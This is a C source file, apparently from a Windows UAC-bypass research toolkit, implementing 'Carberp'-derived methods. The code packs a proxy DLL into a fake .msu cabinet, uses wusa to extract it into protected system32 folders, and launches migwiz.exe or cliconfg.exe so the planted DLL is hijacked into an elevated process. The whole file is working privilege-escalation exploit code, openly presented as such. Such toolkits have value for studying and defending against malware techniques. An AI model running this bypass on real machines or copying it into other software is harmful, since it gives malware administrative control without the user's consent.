/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2014 - 2019
*
*  TITLE:       CARBERP.C
*
*  VERSION:     3.17
*
*  DATE:        18 Mar 2019
*
*  Tweaked Carberp methods.
*  Original Carberp is exploiting mcx2prov.exe in ehome.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"

/*
* ucmWusaMethod
*
* Purpose:
*
* Build and install fake msu package then run target application.
*
* Fixed in Windows 10 TH1
*
*/
NTSTATUS ucmWusaMethod(
    _In_ UCM_METHOD Method,
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    NTSTATUS    MethodResult = STATUS_ACCESS_DENIED;
    WCHAR       szSourceDll[MAX_PATH * 2];
    WCHAR       szTargetProcess[MAX_PATH * 2];
    WCHAR       szTargetDirectory[MAX_PATH * 2];

    _strcpy(szTargetProcess, g_ctx->szSystemDirectory);
    _strcpy(szTargetDirectory, g_ctx->szSystemDirectory);
    _strcpy(szSourceDll, g_ctx->szTempDirectory);

    switch (Method) {

    // 
    // Use migwiz.exe as target.
    // szTargetDirectory is system32\migwiz
    //
    case UacMethodCarberp1:
        _strcat(szSourceDll, WDSCORE_DLL);
        _strcat(szTargetDirectory, MIGWIZ_DIR);
        _strcat(szTargetProcess, MIGWIZ_DIR);
        _strcat(szTargetProcess, MIGWIZ_EXE);
        break;

    //
    // Use cliconfg.exe as target.
    // szTargetDirectory is system32
    //
    case UacMethodCarberp2:
        _strcat(szSourceDll, NTWDBLIB_DLL);
        _strcat(szTargetProcess, CLICONFG_EXE);
        break;

    default:
        return STATUS_INVALID_PARAMETER;
    }

    if (!PathFileExists(szTargetProcess)) {
        return STATUS_OBJECT_NAME_NOT_FOUND;
    }

    //
    // Extract file to the protected directory
    // First, create cab with fake msu ext, second run fusion process.
    //
    if (ucmCreateCabinetForSingleFile(
        szSourceDll,
        ProxyDll,
        ProxyDllSize,
        NULL))
    {

        if (ucmWusaExtractPackage(szTargetDirectory)) {
            //run target process for dll hijacking
            if (supRunProcess(szTargetProcess, NULL))
                MethodResult = STATUS_SUCCESS;
        }
        ucmWusaCabinetCleanup();
    }

    return MethodResult;
}
